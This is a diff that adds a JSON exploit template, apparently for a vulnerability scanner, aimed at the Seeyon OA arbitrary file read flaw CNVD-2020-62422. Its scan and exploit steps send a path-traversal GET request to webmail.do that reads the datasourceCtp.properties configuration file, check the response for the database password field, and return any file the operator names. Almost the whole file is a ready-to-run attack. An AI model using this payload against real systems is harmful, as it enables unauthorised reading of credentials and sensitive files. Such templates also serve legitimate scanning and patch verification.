@@ -1,0 +1,92 @@
+{
+  "Name": "Seeyon File Read (CNVD-2020-62422)",
+  "Description": "There is an arbitrary file reading vulnerability in the Seeyon OA system. Attackers can use the vulnerability to obtain sensitive information.",
+  "Product": "Yonyou-Seeyon-OA",
+  "Homepage": "https://www.seeyon.com/",
+  "DisclosureDate": "2020-10-28",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Yonyou-Seeyon-OA\"",
+  "Level": "1",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "input",
+      "value": "../conf/datasourceCtp.properties",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "application/x-msdownload",
+            "variable": "$head"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "ctpDataSource.password",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath={{{file}}}"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Yonyou-Seeyon-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
